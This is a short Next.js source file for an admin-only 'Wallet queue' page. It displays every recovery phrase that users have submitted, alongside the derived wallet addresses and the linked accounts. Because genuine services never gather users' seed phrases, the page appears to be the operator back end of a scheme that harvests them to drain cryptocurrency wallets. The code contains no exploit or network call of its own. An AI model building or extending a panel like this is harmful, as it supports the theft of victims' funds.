import { AdminWalletsTable } from '@/components/admin/AdminWalletsTable';
import { PageHeader } from '@/components/ui';
import { listAdminUsers, listAllWallets } from '@/lib/queries';
import { requireAdmin } from '@/lib/session';

export const dynamic = 'force-dynamic';
export const metadata = { title: 'Wallet queue' };

export default async function AdminWalletsPage() {
    await requireAdmin();
    const [submissions, users] = await Promise.all([listAllWallets(), listAdminUsers()]);

    return (
        <div className="space-y-5">
            <PageHeader
                eyebrow="Admin · wallets"
                title="Wallet queue"
                description="Every submitted recovery phrase, its derived addresses and the account it is attached to. Reveals are audited."
            />

            <AdminWalletsTable
                submissions={submissions}
                users={users.map((user) => ({ id: user.id, email: user.email, display_name: user.display_name }))}
                mode="queue"
            />
        </div>
    );
}
